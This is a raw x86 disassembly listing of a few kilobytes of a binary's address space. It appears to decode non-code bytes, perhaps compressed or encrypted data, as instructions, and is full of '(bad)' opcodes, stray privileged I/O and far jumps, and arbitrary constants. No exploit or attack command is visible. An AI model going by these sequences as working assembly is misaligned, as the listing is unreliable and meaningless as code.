  41d25a:	push   0xcac839cd
  41d25f:	outs   dx,BYTE PTR ds:[esi]
  41d260:	clc    
  41d261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d262:	shl    BYTE PTR [eax-0x16],1
  41d265:	enter  0x5f,0x7e
  41d269:	je     0x41d2e6
  41d26b:	mov    esp,0xc8cf0571
  41d270:	(bad)  
  41d272:	inc    edi
  41d273:	fist   WORD PTR [edx+0x2e]
  41d276:	dec    ebp
  41d277:	loop   0x41d20d
  41d279:	out    dx,al
  41d27a:	jmp    0xa4b8:0xe9875c45
  41d281:	jns    0x41d23c
  41d283:	add    al,0xfb
  41d285:	nop
  41d286:	jnp    0x41d28c
  41d288:	inc    eax
  41d289:	cmp    al,BYTE PTR [ecx+0x6]
  41d28c:	lahf   
  41d28d:	loope  0x41d249
  41d28f:	imul   ebx,DWORD PTR ds:0x929ad378,0xed2cd9c
  41d299:	adc    al,0xf7
  41d29b:	xchg   edi,eax
  41d29c:	ja     0x41d30e
  41d29e:	sar    BYTE PTR [esi],cl
  41d2a0:	sub    ebp,DWORD PTR [ebp-0x5d]
  41d2a3:	scas   al,BYTE PTR es:[edi]
  41d2a4:	adc    dl,ch
  41d2a6:	ret    0xf607
  41d2a9:	iret   
  41d2aa:	or     esi,DWORD PTR [esi]
  41d2ac:	add    al,0x6c
  41d2ae:	xor    esi,DWORD PTR [ebp-0x2f]
  41d2b1:	in     al,dx
  41d2b2:	sbb    ebp,DWORD PTR [esi-0x5dd81c00]
  41d2b8:	sahf   
  41d2b9:	pop    ds
  41d2ba:	in     al,dx
  41d2bb:	push   cs
  41d2bc:	mov    ?,WORD PTR [edx]
  41d2be:	push   ebx
  41d2bf:	js     0x41d26c
  41d2c1:	jbe    0x41d2d7
  41d2c3:	sahf   
  41d2c4:	push   edx
  41d2c5:	pop    esp
  41d2c6:	fwait
  41d2c7:	nop
  41d2c8:	mov    bh,0xc6
  41d2ca:	xchg   ebx,eax
  41d2cb:	push   eax
  41d2cc:	pop    edx
  41d2cd:	clc    
  41d2ce:	ret    
  41d2cf:	add    BYTE PTR [ebp-0x1ddc11c6],dh
  41d2d5:	gs hlt 
  41d2d7:	jnp    0x41d2f7
  41d2d9:	pusha  
  41d2da:	jmp    0xffcc:0xbff50d1d
  41d2e1:	xchg   esi,eax
  41d2e2:	stc    
  41d2e3:	loopne 0x41d2b2
  41d2e5:	push   0x26b94725
  41d2ea:	int3   
  41d2eb:	lock fdiv DWORD PTR [ebx-0x79]
  41d2ef:	aad    0x8f
  41d2f1:	je     0x41d2e8
  41d2f3:	jg     0x41d2e1
  41d2f5:	sub    eax,0x12ccdb49
  41d2fa:	fcom   st(5)
  41d2fc:	push   ss
  41d2fd:	push   ss
  41d2fe:	xlat   BYTE PTR ds:[ebx]
  41d2ff:	fyl2x  
  41d301:	(bad)  
  41d302:	ficomp DWORD PTR [ecx-0x3688157e]
  41d308:	mov    ch,0xb5
  41d30a:	mov    al,0xd7
  41d30c:	int    0xa1
  41d30e:	cmp    ch,al
  41d310:	pop    edx
  41d311:	pop    edi
  41d312:	sub    eax,0xaf3e046e
  41d317:	mov    ecx,0xa4f1755e
  41d31c:	clc    
  41d31d:	clc    
  41d31e:	sbb    bl,bl
  41d320:	pop    es
  41d321:	pop    edx
  41d322:	(bad)  
  41d323:	push   esi
  41d324:	jno    0x41d2b8
  41d326:	mov    eax,0x4461acaf
  41d32b:	mov    gs,WORD PTR [ebx+ecx*1]
  41d32e:	dec    ecx
  41d32f:	push   ecx
  41d330:	(bad)  
  41d332:	pop    ss
  41d333:	jb     0x41d31b
  41d335:	and    ah,BYTE PTR [edx-0x4d754910]
  41d33b:	push   esi
  41d33c:	sbb    al,0xcd
  41d33e:	jbe    0x41d35a
  41d340:	jecxz  0x41d396
  41d342:	aam    0x9a
  41d344:	xlat   BYTE PTR ds:[ebx]
  41d345:	mov    al,ds:0x58fc341c
  41d34a:	pop    es
  41d34b:	mov    esi,0x497b143f
  41d350:	jo     0x41d361
  41d352:	mov    edx,0xfd489640
  41d357:	push   edx
  41d358:	inc    ecx
  41d359:	fbstp  TBYTE PTR [edi-0x245c8772]
  41d35f:	adc    al,0x77
  41d361:	in     eax,0xe9
  41d363:	and    eax,DWORD PTR [esi+edi*1]
  41d366:	mov    esi,0x76219a33
  41d36b:	mov    ds:0xe72fbf24,eax
  41d370:	not    DWORD PTR [edx+0x6627933a]
  41d376:	imul   BYTE PTR [ebx+edi*8]
  41d379:	adc    ebp,ecx
  41d37b:	dec    ebx
  41d37c:	stos   DWORD PTR es:[edi],eax
  41d37d:	ret    0x95
  41d380:	jno    0x41d3a3
  41d382:	mov    ecx,0xd2dc6c99
  41d387:	mov    dl,0x5a
  41d389:	jle    0x41d3a0
  41d38b:	inc    al
  41d38d:	ror    BYTE PTR [ebx-0x6],0xdb
  41d391:	and    esp,DWORD PTR [edx]
  41d393:	out    0xfe,eax
  41d395:	sub    eax,0xf06171a7
  41d39a:	aad    0x42
  41d39c:	push   ds
  41d39d:	rol    DWORD PTR [edi+0x1f],cl
  41d3a0:	in     eax,0x2a
  41d3a2:	(bad)  
  41d3a3:	sub    DWORD PTR [esp+esi*1-0x80],edi
  41d3a7:	imul   ecx,DWORD PTR [ebp-0x38],0xffffff95
  41d3ab:	mov    esp,0xa0715e97
  41d3b0:	fdiv   QWORD PTR [esi-0x5f]
  41d3b3:	test   DWORD PTR [ebp-0x23e6e421],edi
  41d3b9:	out    dx,eax
  41d3ba:	cmp    dl,BYTE PTR [eax+ebx*1+0x4903a757]
  41d3c1:	popa   
  41d3c2:	add    al,0xbb
  41d3c4:	jg     0x41d3ca
  41d3c6:	ss pop ebp
  41d3c8:	push   ebp
  41d3c9:	push   edx
  41d3ca:	mov    al,0x0
  41d3cc:	paddusw mm3,QWORD PTR [ebp+0x9fd9d64]
  41d3d3:	pop    esp
  41d3d4:	jle    0x41d449
  41d3d6:	mov    dl,0xa9
  41d3d8:	jge    0x41d3c5
  41d3da:	retf   0xaa7d
  41d3dd:	repz in al,0x5f
  41d3e0:	or     BYTE PTR [edx+0x3f4ffa01],cl
  41d3e6:	add    al,0xdd
  41d3e8:	xchg   ecx,eax
  41d3e9:	ret    
  41d3ea:	shl    BYTE PTR [ebx+0x5b],1
  41d3ed:	pushf  
  41d3ee:	xlat   BYTE PTR ds:[ebx]
  41d3ef:	iret   
  41d3f0:	cmp    DWORD PTR [esi+0x3d],ecx
  41d3f3:	xor    eax,eax
  41d3f5:	pop    edi
  41d3f6:	(bad)  
  41d3f7:	mov    ebx,0x9871d17a
  41d3fc:	inc    esp
  41d3fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3fe:	jae    0x41d3da
  41d400:	xor    ebp,DWORD PTR [edx]
  41d402:	jmp    0x41d3bc
  41d404:	popf   
  41d405:	jmp    0x978ec62d
  41d40a:	adc    eax,0x78896285
  41d40f:	test   BYTE PTR [ebp+0x175337c0],cl
  41d415:	enter  0xa94a,0x3
  41d419:	(bad)  
  41d41a:	adc    DWORD PTR [eax+0x60d64428],ebx
  41d420:	sahf   
  41d421:	fidiv  DWORD PTR ds:0x790a72f3
  41d427:	call   FWORD PTR [esp+ebx*4+0x50]
  41d42b:	pusha  
  41d42c:	sub    edx,DWORD PTR [ebp+0x65000c74]
  41d432:	hlt    
  41d433:	xchg   ebx,eax
  41d434:	xchg   ecx,eax
  41d435:	jo     0x41d418
  41d437:	jns    0x41d3fa
  41d439:	xchg   esi,eax
  41d43a:	fstp   st(6)
  41d43c:	push   edx
  41d43d:	(bad)  
  41d43e:	pop    ebp
  41d43f:	jns    0x41d457
  41d441:	bndldx bnd2,[ecx-0x78]
  41d445:	out    0xb0,al
  41d447:	push   fs
  41d449:	mov    ecx,0x3de31b31
  41d44e:	ret    0xcb87
  41d451:	mov    esp,0x1daaf9aa
  41d456:	mov    ebx,0xa88fe0fe
  41d45b:	call   0x379e6321
  41d460:	cmp    DWORD PTR [ebx-0x7d],ecx
  41d463:	sbb    eax,0xdd88b90a
  41d468:	sti    
  41d469:	pop    ds
  41d46a:	(bad)  
  41d46b:	pop    ds
  41d46c:	jae    0x41d490
  41d46e:	cdq    
  41d46f:	mov    bl,0x91
  41d471:	jbe    0x41d4ab
  41d473:	cmc    
  41d474:	nop
  41d475:	mov    al,ah
  41d477:	adc    ebp,DWORD PTR ds:0xe2af12ac
  41d47d:	lods   eax,DWORD PTR ds:[esi]
  41d47e:	mov    al,BYTE PTR es:[eax]
  41d481:	push   cs
  41d482:	or     bl,BYTE PTR [edx+eax*4]
  41d485:	dec    edi
  41d486:	pop    edx
  41d487:	adc    BYTE PTR [edx+0x1b],0x2e
  41d48b:	bound  esp,QWORD PTR [edi+0x9]
  41d48e:	pushf  
  41d48f:	cmc    
  41d490:	sbb    edi,DWORD PTR [ebp-0x72]
  41d493:	add    bl,BYTE PTR [edx]
	...
  41d511:	add    BYTE PTR [eax],al
  41d513:	add    BYTE PTR [edi],ah
  41d515:	and    eax,0xbb873b85
  41d51a:	mov    edi,0xe22d13d
  41d51f:	pusha  
  41d520:	dec    edi
  41d521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d522:	add    eax,0x170e51b
  41d527:	add    BYTE PTR [ecx+0x7],ch
  41d52a:	add    BYTE PTR [eax],al
  41d52c:	sub    DWORD PTR [edi+edx*1],0xb723ef8b
  41d533:	dec    edx
  41d534:	xchg   ecx,eax
  41d535:	sahf   
  41d536:	lods   al,BYTE PTR ds:[esi]
  41d537:	(bad)  
  41d538:	cld    
  41d539:	mov    edx,0xe266a3ac
  41d53e:	mov    al,ds:0xddd42734
  41d543:	hlt    
  41d544:	mov    dh,0xed
  41d546:	mov    ebp,0x1c00d7ac
  41d54b:	leave  
  41d54c:	push   esi
  41d54d:	dec    esi
  41d54e:	push   esp
  41d54f:	ss push cs
  41d551:	out    dx,al
  41d552:	mov    WORD PTR [esi+0x76],?
  41d555:	mov    esi,0x392057da
  41d55a:	shl    DWORD PTR [edi+ecx*2],cl
  41d55d:	jae    0x41d52a
  41d55f:	and    eax,0xef84b7bc
  41d564:	rcr    DWORD PTR [eax-0x72],1
  41d567:	pop    eax
  41d568:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41d56a:	or     ecx,DWORD PTR [esi]
  41d56c:	cmp    edx,DWORD PTR [ebp-0x42]
  41d56f:	mov    dh,0x34
  41d571:	inc    edi
  41d572:	(bad)  
  41d573:	(bad)  
  41d574:	cmp    esp,ecx
  41d576:	sub    DWORD PTR [edx+0x3f],eax
  41d579:	inc    ebp
  41d57a:	(bad)  
  41d57b:	aam    0xd2
  41d57d:	out    0x70,eax
  41d57f:	std    
  41d580:	xchg   ebx,eax
  41d581:	lea    edi,[esi+eax*4]
  41d584:	scas   eax,DWORD PTR es:[edi]
  41d585:	(bad)  
  41d586:	push   esp
  41d588:	retf   
  41d589:	inc    ebx
  41d58a:	(bad)  
  41d58b:	sbb    al,0x66
  41d58d:	shr    DWORD PTR [ebp+edx*2+0x7f],0x8c
  41d592:	mov    ch,0xf5
  41d594:	xor    BYTE PTR [ecx+edx*2+0x3a],cl
  41d598:	cmp    al,0x4d
  41d59a:	mov    edi,DWORD PTR [edx]
  41d59c:	test   al,0x12
  41d59e:	test   BYTE PTR [ebx+0x4fbcd3cd],dl
  41d5a4:	cld    
  41d5a5:	out    dx,eax
  41d5a6:	fimul  DWORD PTR [ebx+0x7625cc7e]
  41d5ac:	push   edi
  41d5ad:	ins    DWORD PTR es:[edi],dx
  41d5ae:	dec    esi
  41d5af:	fisubr DWORD PTR [edx-0x66]
  41d5b2:	ja     0x41d5d0
  41d5b4:	mov    cl,0x1b
  41d5b6:	fst    QWORD PTR [esi]
  41d5b8:	lea    esi,[edi-0x434f6f9]
  41d5be:	retf   0xeef1
  41d5c1:	retf   0x3113
  41d5c4:	cmp    al,0x8d
  41d5c6:	push   eax
  41d5c7:	and    BYTE PTR [ebx],ah
  41d5c9:	sub    ebp,DWORD PTR [ebx+0x2f]
  41d5cc:	push   ebp
  41d5cd:	cmc    
  41d5ce:	add    ebp,ebp
  41d5d0:	inc    ebx
  41d5d1:	mov    dh,0x96
  41d5d3:	and    al,ch
  41d5d5:	test   al,0x6b
  41d5d7:	sbb    bh,cl
  41d5d9:	and    bl,dh
  41d5db:	(bad)  
  41d5dc:	push   ebp
  41d5dd:	push   ds
  41d5de:	arpl   WORD PTR [ecx+ebp*1],sp
  41d5e1:	mov    WORD PTR [eax],es
  41d5e3:	mov    eax,0x2c1519d1
  41d5e8:	neg    DWORD PTR [eax+0x5e13c723]
  41d5ee:	cmp    ch,BYTE PTR [edx+0x1deba72f]
  41d5f4:	int    0x72
  41d5f6:	mov    dl,0x2d
  41d5f8:	inc    edx
  41d5f9:	sub    eax,0xb761e61d
  41d5fe:	jmp    0xa4d2:0x9121a3ec
  41d605:	aam    0x88
  41d607:	push   ebx
  41d608:	mov    ch,0x68
  41d60a:	mov    esi,0xf650c281
  41d60f:	adc    cl,BYTE PTR gs:[di+0x474c]
  41d615:	stos   DWORD PTR es:[edi],eax
  41d616:	xor    DWORD PTR [eax],ebx
  41d618:	xor    eax,0xc7a976e5
  41d61d:	and    bh,dh
  41d61f:	push   esp
  41d620:	lahf   
  41d621:	cmc    
  41d622:	xlat   BYTE PTR ds:[ebx]
  41d623:	vpsubw ymm4,ymm2,YMMWORD PTR [eax+0x4c2acd2a]
  41d62b:	(bad)  
  41d62c:	sbb    al,0x71
  41d62e:	mov    bl,0xe7
  41d630:	xchg   edx,eax
  41d631:	sub    DWORD PTR [ebx+0x56],edx
  41d634:	mov    BYTE PTR [ebp+0x74c566dc],bh
  41d63a:	push   edx
  41d63b:	lahf   
  41d63c:	xchg   ebp,eax
  41d63d:	pop    edi
  41d63e:	scas   eax,DWORD PTR es:[edi]
  41d63f:	push   ebx
  41d640:	and    eax,eax
  41d642:	mov    gs,WORD PTR [ebp-0x1b]
  41d645:	data16 ror BYTE PTR [edx+0x64],0xbe
  41d64a:	mov    ch,0xe5
  41d64c:	icebp  
  41d64d:	mov    dh,0x8d
  41d64f:	adc    al,BYTE PTR [esi+0x64]
  41d652:	sub    edx,edx
  41d654:	addr16 je 0x41d6a3
  41d657:	jne    0x41d61b
  41d659:	push   edx
  41d65a:	lds    esi,FWORD PTR [ebx+0x5c]
  41d65d:	inc    edx
  41d65e:	nop
  41d65f:	xchg   BYTE PTR [esi-0x302972d],cl
  41d665:	stos   DWORD PTR es:[edi],eax
  41d666:	xchg   ecx,eax
  41d667:	pop    edx
  41d668:	repz lahf 
  41d66a:	out    0x62,eax
  41d66c:	test   al,0xa1
  41d66e:	lds    ebp,FWORD PTR [ebx+0x7dd6be82]
  41d674:	mov    al,ds:0x4d0ccb7
  41d679:	mov    bl,BYTE PTR ds:0x3620b459
  41d67f:	add    BYTE PTR [esi],cl
  41d681:	pop    ss
  41d682:	nop
  41d683:	and    DWORD PTR [ebp+0x5a],eax
  41d686:	mov    dl,0x1e
  41d688:	ins    BYTE PTR es:[edi],dx
  41d689:	pusha  
  41d68a:	test   al,0x98
  41d68c:	push   eax
  41d68d:	cmc    
  41d68e:	add    BYTE PTR [eax-0x3f93dd07],0xb5
  41d695:	mov    bl,BYTE PTR [edx+0x4a]
  41d698:	pusha  
  41d699:	push   0x9c31378
  41d69e:	and    cl,BYTE PTR [edx-0x26ccf97]
  41d6a4:	dec    eax
  41d6a5:	fs mov edi,0xd567ef35
  41d6ab:	mov    WORD PTR [ebx],fs
  41d6ad:	pusha  
  41d6ae:	sbb    eax,0xb4125314
  41d6b3:	push   0xffffffdf
  41d6b5:	sub    DWORD PTR [esi+0x3c],edx
  41d6b8:	scas   eax,DWORD PTR es:[edi]
  41d6b9:	or     dl,cl
  41d6bb:	das    
  41d6bc:	retf   
  41d6bd:	mov    dl,0xb9
  41d6bf:	psrlq  mm2,QWORD PTR [eax-0x5234c0da]
  41d6c6:	fs push ecx
  41d6c8:	xor    ecx,DWORD PTR [edi+edi*2]
  41d6cb:	mov    dh,0x8d
  41d6cd:	clc    
  41d6ce:	stc    
  41d6cf:	xor    al,0x55
  41d6d1:	outs   dx,BYTE PTR ds:[esi]
  41d6d2:	scas   al,BYTE PTR es:[edi]
  41d6d3:	jle    0x41d73d
  41d6d5:	test   BYTE PTR [ecx],ah
  41d6d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6d8:	(bad)  [ecx-0x110790ff]
  41d6df:	pop    ebx
  41d6e0:	pop    esp
  41d6e1:	popf   
  41d6e2:	jnp    0x41d66f
  41d6e4:	cdq    
  41d6e5:	pop    eax
  41d6e6:	mov    ds:0x307b1d39,al
  41d6eb:	or     al,BYTE PTR [edx-0x22]
  41d6ee:	mov    ecx,0x632661a1
  41d6f3:	popa   
  41d6f4:	jge    0x41d767
  41d6f6:	adc    al,0x3a
  41d6f8:	mov    ebp,0xf3f2d381
  41d6fd:	push   ds
  41d6fe:	pavgw  mm5,QWORD PTR [esi]
  41d701:	ror    al,cl
  41d703:	sub    dh,BYTE PTR [ebx]
  41d705:	and    DWORD PTR [ecx],esi
  41d707:	add    cl,al
  41d709:	scas   eax,DWORD PTR es:[edi]
  41d70a:	mov    al,0x78
  41d70c:	call   DWORD PTR [ecx]
  41d70e:	ret    0xc461
  41d711:	jne    0x41d734
  41d713:	out    dx,eax
  41d714:	(bad)  
  41d715:	stos   DWORD PTR es:[edi],eax
  41d716:	cmp    DWORD PTR [eax],esi
  41d718:	shr    esi,cl
  41d71a:	and    al,BYTE PTR [edx-0x23]
  41d71d:	pop    edx
  41d71e:	popf   
  41d71f:	(bad)  
  41d720:	out    0x80,eax
  41d722:	mov    ds:0x3082fc68,al
  41d727:	push   es
  41d728:	popf   
  41d729:	sub    BYTE PTR [esi-0x1879a897],dh
  41d72f:	cs dec eax
  41d731:	add    BYTE PTR [ebp+edx*4+0x70],bh
  41d735:	push   ebx
  41d736:	add    BYTE PTR [ecx+ebx*2],dl
  41d739:	loop   0x41d717
  41d73b:	and    cl,BYTE PTR [esi-0x63]
  41d73e:	push   ebx
  41d73f:	jl     0x41d743
  41d741:	cmp    al,0x30
  41d743:	sbb    BYTE PTR [edx-0x2],ah
  41d746:	imul   esp,DWORD PTR [edi+0x4e],0x347c3261
  41d74d:	nop
  41d74e:	pushf  
  41d74f:	call   0xde5eacb2
  41d754:	lea    ecx,[eax+ebp*2-0x72]
  41d758:	std    
  41d759:	and    BYTE PTR [eax+edx*8+0x1d771045],bh
  41d760:	cs xchg esp,eax
  41d762:	add    BYTE PTR ds:0xa3f8ecca,dl
  41d768:	sub    BYTE PTR [esi+0x15],dl
  41d76b:	mov    esi,0xf025fcaf
  41d770:	and    DWORD PTR [eax+0x3f],ecx
  41d773:	dec    eax
  41d774:	test   eax,0x98e9a774
  41d779:	in     al,0x15
  41d77b:	mov    ss,WORD PTR [ecx-0x3dde1d1a]
  41d781:	stc    
  41d782:	int    0x6e
  41d784:	xchg   ebp,eax
  41d785:	frstor [edi+0x142240c3]
  41d78b:	aaa    
  41d78c:	adc    ebx,DWORD PTR [edx+0x55]
  41d78f:	mov    ecx,0xd5461832
  41d794:	sbb    BYTE PTR ds:0xac6bdad6,bh
  41d79a:	gs jge 0x41d761
  41d79d:	jl     0x41d81e
  41d79f:	(bad)  
  41d7a0:	ficomp WORD PTR [ecx]
  41d7a2:	pop    edx
  41d7a3:	adc    eax,0x71133e12
  41d7a8:	mov    ds:0x940c97d9,al
  41d7ad:	sub    al,0xff
  41d7af:	push   ebx
  41d7b0:	adc    al,0xf6
  41d7b2:	ret    
  41d7b3:	call   0x34940bb7
  41d7b8:	xchg   edx,eax
  41d7b9:	dec    eax
  41d7ba:	mov    bl,BYTE PTR [esi]
  41d7bc:	lahf   
  41d7bd:	inc    ecx
  41d7be:	pop    edx
  41d7bf:	fsubr  st,st(5)
  41d7c1:	mov    DWORD PTR [ebp+ecx*4-0x5f],ebp
  41d7c5:	adc    al,0x1b
  41d7c7:	push   edi
  41d7c8:	mov    ecx,esi
  41d7ca:	cli    
  41d7cb:	xor    esi,0xec680393
  41d7d1:	jge    0x41d810
  41d7d3:	xchg   edx,eax
  41d7d4:	mov    ebp,0x76ec9388
  41d7d9:	xchg   edx,eax
  41d7da:	outs   dx,BYTE PTR ds:[esi]
  41d7db:	sahf   
  41d7dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7dd:	out    0x8c,al
  41d7df:	jg     0x41d788
  41d7e1:	outs   dx,DWORD PTR ds:[esi]
  41d7e2:	sbb    DWORD PTR [edi-0x346855e8],0xba336b7e
  41d7ec:	mov    dl,0x50
  41d7ee:	scas   al,BYTE PTR es:[edi]
  41d7ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7f0:	test   al,0x9d
  41d7f2:	mov    ah,0x11
  41d7f4:	mov    ebx,0xcf338e67
  41d7f9:	jmp    0x41d7d3
  41d7fb:	jmp    0x746f:0xa3a0c99e
  41d802:	mov    eax,0x1d912074
  41d807:	das    
  41d808:	xchg   esi,eax
  41d809:	jb     0x41d7ba
  41d80b:	shr    DWORD PTR [edi-0x37],cl
  41d80e:	js     0x41d7bb
  41d810:	int3   
  41d811:	test   DWORD PTR [eax],eax
  41d813:	jns    0x41d7e0
  41d815:	push   ebp
  41d816:	jb     0x41d87e
  41d818:	pop    ecx
  41d819:	inc    esi
  41d81a:	fisub  WORD PTR [ebx+edx*2-0x24]
  41d81e:	mov    BYTE PTR [edi+eax*2+0x13],0xff
  41d823:	retf   0x7510
  41d826:	enter  0xfb38,0x26
  41d82a:	pushf  
  41d82b:	(bad)  
  41d82d:	in     al,dx
  41d82e:	int3   
  41d82f:	stos   DWORD PTR es:[edi],eax
  41d830:	ror    DWORD PTR [ebx-0x7d68f460],cl
  41d836:	test   DWORD PTR [ebx-0xe],esi
  41d839:	mov    ah,0x33
  41d83b:	mov    ecx,0xf35af24f
  41d840:	into   
  41d841:	out    dx,eax
  41d842:	or     ebp,DWORD PTR [esi-0x680a5371]
  41d848:	cli    
  41d849:	and    eax,0x7dcfbb38
  41d84e:	adc    esi,DWORD PTR [ebx]
  41d850:	jns    0x41d7fb
  41d852:	mov    ds:0x3bf0f844,al
  41d857:	and    DWORD PTR [edi+0x24],eax
  41d85a:	cmp    dl,BYTE PTR [eax]
  41d85c:	lods   eax,DWORD PTR ds:[esi]
  41d85d:	jbe    0x41d857
  41d85f:	mov    eax,0xd742d479
  41d864:	popf   
  41d865:	mov    dl,BYTE PTR [edx-0xbb16d2]
  41d86b:	xchg   edx,eax
  41d86c:	(bad)  
  41d86d:	stc    
  41d86e:	popf   
  41d86f:	add    eax,0x47c09f55
  41d874:	lds    edx,FWORD PTR [ecx]
  41d876:	mov    ds:0x112f5c87,al
  41d87b:	in     al,0xaa
  41d87d:	xor    BYTE PTR [ebx],bh
  41d87f:	fwait
  41d880:	test   DWORD PTR [edx+0x7c],0x4290f19e
  41d887:	sub    al,BYTE PTR [esi+0x2f]
  41d88a:	aas    
  41d88b:	mov    dl,0x91
  41d88d:	stos   BYTE PTR es:[edi],al
  41d88e:	or     DWORD PTR [edi-0x40b0e275],esp
  41d894:	ins    BYTE PTR es:[edi],dx
  41d895:	stos   BYTE PTR es:[edi],al
  41d896:	jbe    0x41d84e
  41d898:	iret   
  41d899:	push   edx
  41d89a:	(bad)  
  41d89b:	and    eax,0xdd89de5d
  41d8a0:	lods   eax,DWORD PTR ds:[esi]
  41d8a1:	and    ch,BYTE PTR [eax-0x169f7291]
  41d8a7:	test   eax,0xc55d438a
  41d8ac:	lahf   
  41d8ad:	test   al,0x45
  41d8af:	dec    ebx
  41d8b0:	cmp    eax,DWORD PTR [bp+di+0x2689]
  41d8b5:	cmc    
  41d8b6:	jmp    0xdde9:0x133f45dc
  41d8bd:	rol    DWORD PTR [eax],0x62
  41d8c0:	jecxz  0x41d909
  41d8c2:	mov    esi,DWORD PTR [ecx]
  41d8c4:	fadd   DWORD PTR [ebx]
  41d8c6:	lock and al,0x8
  41d8c9:	leave  
  41d8ca:	pushf  
  41d8cb:	(bad)  
  41d8cc:	push   esi
  41d8cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8ce:	shr    DWORD PTR [esi-0x32269c32],cl
  41d8d4:	fadd   QWORD PTR [esi+0x7723e657]
  41d8da:	mov    ebx,eax
  41d8dc:	pop    ebp
  41d8dd:	popf   
  41d8de:	push   edi
  41d8df:	ja     0x41d867
  41d8e1:	adc    eax,DWORD PTR [edx]
  41d8e3:	dec    esi
  41d8e4:	push   ebx
  41d8e5:	and    DWORD PTR [edx],ebp
  41d8e7:	jo     0x41d938
  41d8e9:	int3   
  41d8ea:	pop    esp
  41d8eb:	adc    eax,0x4558f314
  41d8f0:	(bad)  
  41d8f1:	ins    BYTE PTR es:[edi],dx
  41d8f2:	dec    ebx
  41d8f3:	je     0x41d888
  41d8f5:	enter  0x550e,0xfc
  41d8f9:	ret    0xc9a9
  41d8fc:	pop    ebx
  41d8fd:	cwde   
  41d8fe:	jecxz  0x41d903
  41d900:	push   0xffffff97
  41d902:	jnp    0x41d8d4
  41d904:	adc    bl,BYTE PTR [esp+edi*2+0x52709370]
  41d90b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d90c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d90d:	sub    BYTE PTR ds:[edx],0xb5
  41d911:	add    al,bl
  41d913:	mov    ds:0xec2a96ca,al
  41d918:	mov    fs,WORD PTR [ebx+0x6b78800c]
  41d91e:	cmp    eax,0x1482900e
  41d923:	xchg   ecx,eax
  41d924:	pop    ds
  41d925:	xchg   ebp,eax
  41d926:	jecxz  0x41d93c
  41d928:	into   
  41d929:	mov    WORD PTR [ecx+0x6d],?
  41d92c:	xlat   BYTE PTR ds:[ebx]
  41d92d:	pop    esp
  41d92e:	mov    cl,0x46
  41d930:	cmp    ch,BYTE PTR ds:0xb6844f1b
  41d936:	add    eax,0xc9006cf7
  41d93b:	sbb    ebx,DWORD PTR [edx+0x44]
  41d93e:	dec    esi
  41d93f:	xchg   ebp,edi
  41d941:	into   
  41d942:	es jo  0x41d8ca
  41d945:	xor    ah,ch
  41d947:	adc    ebp,DWORD PTR [edi+ecx*2-0x80]
  41d94b:	mov    bl,BYTE PTR [edi-0x3d0cef8]
  41d951:	aam    0xd0
  41d953:	out    0x83,al
  41d955:	loope  0x41d98d
  41d957:	popa   
  41d958:	mov    al,0xef
  41d95a:	or     bh,ah
  41d95c:	mov    dl,0xe5
  41d95e:	sti    
  41d95f:	jle    0x41d988
  41d961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d962:	or     BYTE PTR [ebx],cl
  41d964:	enter  0x6664,0xd5
  41d968:	sub    ebp,ebx
  41d96a:	retf   0xe46
  41d96d:	ret    
  41d96e:	xor    ecx,DWORD PTR [esi-0x4f]
  41d971:	mov    al,ds:0x2640ba4d
  41d976:	add    esi,esi
  41d978:	cmp    BYTE PTR [edx],cl
  41d97a:	hlt    
  41d97b:	sub    eax,0xbc1aa64e
  41d980:	push   ebp
  41d981:	add    al,0x3b
  41d983:	push   ss
  41d984:	sbb    bh,BYTE PTR [ecx-0x41d9477e]
  41d98a:	pop    ecx
  41d98b:	pop    esi
  41d98c:	sbb    BYTE PTR [ebx+0x72],bl
  41d98f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d990:	mov    ch,0x56
  41d992:	fadd   QWORD PTR [esp+edx*1-0x26ad83ea]
  41d999:	cdq    
  41d99a:	add    eax,0x754260c4
  41d99f:	mov    dl,0x3b
  41d9a1:	mov    dh,0x92
  41d9a3:	push   edi
  41d9a4:	(bad)  
  41d9a5:	mov    edx,0x4491b304
  41d9aa:	rcl    DWORD PTR [edx-0x453463f0],cl
  41d9b0:	aas    
  41d9b1:	add    al,0xdd
  41d9b3:	(bad)  ds:[eax]
  41d9b6:	inc    esi
  41d9b7:	inc    edx
  41d9b8:	add    DWORD PTR [esi-0x14],0x3c0c857e
  41d9bf:	mov    ecx,0x286fc7f6
  41d9c4:	inc    eax
  41d9c5:	out    dx,al
  41d9c6:	addr16 in al,dx
  41d9c8:	inc    ebx
  41d9c9:	addr16 pop ebp
  41d9cb:	ss test al,0xca
  41d9ce:	ja     0x41d9f0
  41d9d0:	mov    bl,0x8e
  41d9d2:	dec    esp
  41d9d3:	test   DWORD PTR [edi+0x3d1b2a50],ebx
  41d9d9:	and    eax,0x5d6f1455
  41d9de:	cdq    
  41d9df:	xchg   esi,eax
  41d9e0:	push   ss
  41d9e1:	push   cs
  41d9e2:	xchg   esi,eax
  41d9e3:	fstp   DWORD PTR [esi-0x53ba4747]
  41d9e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9ea:	mov    al,ds:0xa92a835b
  41d9ef:	jbe    0x41d9e8
  41d9f1:	(bad)  
  41d9f2:	sbb    bh,BYTE PTR [eax-0x3f818d99]
  41d9f8:	inc    edx
  41d9f9:	jno    0x41da49
  41d9fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9fc:	ins    DWORD PTR es:[edi],dx
  41d9fd:	loope  0x41d9e2
  41d9ff:	xchg   eax,esp
  41da01:	mov    BYTE PTR [ecx+0x1ad4f595],0x68
  41da08:	push   0xf9480314
  41da0d:	in     al,0xb9
  41da0f:	push   es
  41da10:	push   ebp
  41da11:	xor    ah,BYTE PTR [esp+ecx*2+0x3c]
  41da15:	aaa    
  41da16:	(bad)  
  41da17:	fild   DWORD PTR [edi-0x1d]
  41da1a:	push   esi
  41da1b:	xchg   ecx,eax
  41da1c:	enter  0x185a,0x7
  41da20:	jl     0x41da38
